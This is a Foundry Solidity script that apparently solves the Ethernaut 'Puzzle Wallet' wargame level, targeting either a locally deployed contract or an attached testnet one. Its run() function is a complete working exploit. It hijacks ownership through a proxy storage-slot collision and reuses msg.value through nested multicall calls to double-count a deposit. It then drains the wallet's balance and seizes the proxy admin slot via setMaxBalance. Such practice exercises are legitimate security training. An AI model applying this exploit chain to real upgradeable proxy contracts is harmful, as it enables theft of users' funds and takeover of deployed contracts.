// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/PuzzleWallet/PuzzleWallet.sol";

contract PuzzleWalletScript is Script {

    address internal attacker;
    address internal deployer;
    PuzzleProxy targetProxy;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            targetProxy = PuzzleProxy(payable(0x0000000000000000000000000000000000000000)); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            PuzzleWallet wallet = new PuzzleWallet();
            bytes memory data = abi.encodeWithSignature("init(uint256)", 1 ether);
            targetProxy = new PuzzleProxy(deployer, address(wallet), data);
            PuzzleWallet targetWallet = PuzzleWallet(address(targetProxy));
            targetWallet.addToWhitelist(deployer);
            targetWallet.deposit{value:0.001 ether}();
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        console.log("target.balance : %s wei (0.001 ether)", address(targetProxy).balance);
        PuzzleWallet targetWallet = PuzzleWallet(address(targetProxy));
        console.log("maxBalance : %s", targetWallet.maxBalance()); // this huge because it overided by `admin = _admin`
        

        console.log("[Exploit]");
        vm.startBroadcast(attacker);
        console.log("Getting wallet's owner by execute proposeNewAdmin()");
        targetProxy.proposeNewAdmin(attacker);
        console.log("owner : %s", targetWallet.owner());

        console.log("Getting whitelisted");
        targetWallet.addToWhitelist(attacker);
        console.log("whitelisted[attacker] : %s", targetWallet.whitelisted(attacker));

        console.log("Double spending on deposit()");
        bytes memory dataDeposit = abi.encodeWithSignature("deposit()");
        bytes[] memory dataDepositx1 = new bytes[](1);
        dataDepositx1[0] = dataDeposit;
        bytes memory dataMulticall = abi.encodeWithSignature("multicall(bytes[])", dataDepositx1);
        bytes[] memory dataMulticallx2 = new bytes[](2);
        dataMulticallx2[0] = dataMulticall;
        dataMulticallx2[1] = dataMulticall;
        uint256 amount = address(targetProxy).balance;
        targetWallet.multicall{value:amount}(dataMulticallx2);
        console.log("target.balance : %s wei", address(targetProxy).balance);

        console.log("Withdraw to set target's balance to 0");
        targetWallet.execute(attacker, amount*2, "");
        console.log("target.balance   : %s wei", address(targetProxy).balance);
        console.log("attacker.balance : %s wei", address(attacker).balance);

        console.log("Getting proxy's admin by execute setMaxBalance()");
        targetWallet.setMaxBalance(uint256(uint160(attacker)));
        console.log("admin : %s", targetProxy.admin());
        vm.stopBroadcast();
    }
}